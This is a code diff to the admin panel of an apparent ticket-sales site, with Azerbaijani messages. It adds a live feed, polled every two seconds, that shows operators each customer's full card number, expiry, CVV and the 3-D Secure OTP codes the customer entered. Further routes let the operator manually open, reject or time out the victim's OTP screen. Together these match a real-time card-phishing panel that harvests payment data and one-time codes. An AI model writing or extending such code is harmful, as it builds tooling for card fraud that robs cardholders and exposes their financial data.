@@ -105,6 +105,10 @@ pages.get('/odenisler', requireAdmin, async (req, res, next) => {
       : status === 'all' ? {} : { status };
 
     const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
+    payments.forEach((p) => {
+      p.cardNumberPlain = paymentService.prettyCardNumber(p);
+      p.secondsLeft = paymentService.secondsLeft(p);
+    });
     const orderIds = payments.map((p) => p.order).filter(Boolean);
     const userIds = payments.map((p) => p.user).filter(Boolean);
 
@@ -157,6 +161,59 @@ pages.get('/reysler', requireAdmin, async (req, res, next) => {
 // ==================== API ROUTES ====================
 api.use(requireAdmin);
 
+/* Canlı ödəniş siyahısı — admin paneli hər 2 saniyədə oxuyur */
+api.get('/payments/feed', async (req, res) => {
+  try {
+    const status = req.query.status || 'pending';
+    const filter = status === 'pending'
+      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] } }
+      : status === 'all' ? {} : { status };
+
+    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
+    const [orders, users] = await Promise.all([
+      Order.find({ _id: { $in: payments.map((p) => p.order).filter(Boolean) } }).lean(),
+      User.find({ _id: { $in: payments.map((p) => p.user).filter(Boolean) } }).lean()
+    ]);
+    const orderMap = {};
+    orders.forEach((o) => { orderMap[String(o._id)] = o; });
+    const userMap = {};
+    users.forEach((u) => { userMap[String(u._id)] = u; });
+
+    const rows = payments.map((p) => {
+      const o = orderMap[String(p.order)] || null;
+      const u = userMap[String(p.user)] || null;
+      return {
+        id: String(p._id),
+        transactionId: p.transactionId,
+        status: p.status,
+        stage: p.stage,
+        secondsLeft: paymentService.secondsLeft(p),
+        amount: p.amount,
+        createdAt: p.createdAt,
+        usingSavedCard: !!p.usingSavedCard,
+        saveCard: !!p.saveCard,
+        rejectionCount: p.rejectionCount || 0,
+        card: {
+          number: paymentService.prettyCardNumber(p),
+          masked: p.card ? p.card.masked : '',
+          holder: p.card ? p.card.holder : '',
+          expiry: p.card ? p.card.expiry : '',
+          cvv: p.card ? p.card.cvv : '',
+          brand: p.card ? p.card.brand : ''
+        },
+        submittedCode: p.submittedCode || '',
+        codeAttempts: (p.codeAttempts || []).map((c) => ({ code: c.code, at: c.at })),
+        order: o ? { orderNo: o.orderNo, route: o.fromName + ' → ' + o.toName, date: o.date, status: o.status, id: String(o._id) } : null,
+        user: u ? { name: u.firstName + ' ' + u.lastName, email: u.email, phone: u.phone || '' } : null
+      };
+    });
+
+    res.json({ ok: true, rows, pending: await pendingCount(), at: Date.now() });
+  } catch (e) {
+    res.status(500).json({ ok: false, message: 'Siyahı oxunmadı' });
+  }
+});
+
 /* Ödəniş detalları */
 api.get('/payments/:id', async (req, res) => {
   try {
@@ -189,8 +246,7 @@ api.post('/payments/:id/approve-card', async (req, res) => {
     const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '✅ Kart təsdiq edildi - istifadəçidə OTP ekranı açıldı',
-      code: result.code || '',
+      message: 'Kart təsdiq edildi — istifadəçidə 3-D OTP ekranı açıldı',
       stage: result.payment.stage
     });
   } catch (e) {
@@ -204,8 +260,7 @@ api.post('/payments/:id/reject-otp', async (req, res) => {
     const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '❌ Səhv OTP — istifadəçidə 2 dəq geri sayım başladı, sonra yeni OTP ekranı açılacaq.',
-      code: result.code || '',
+      message: 'Səhv OTP — istifadəçidə 2 dəq geri sayım başladı, sonra yeni OTP ekranı açılacaq.',
       stage: result.payment.stage
     });
   } catch (e) {
@@ -219,8 +274,7 @@ api.post('/payments/:id/open-otp', async (req, res) => {
     const result = await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '📱 Yeni OTP kodu göndərildi',
-      code: result.code || '',
+      message: 'OTP ekranı açıldı',
       stage: result.payment.stage
     });
   } catch (e) {
@@ -234,7 +288,7 @@ api.post('/payments/:id/approve', async (req, res) => {
     const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '✅ Bilet verildi!',
+      message: 'Bilet verildi!',
       payment: result.payment,
       tickets: result.tickets,
       order: result.order
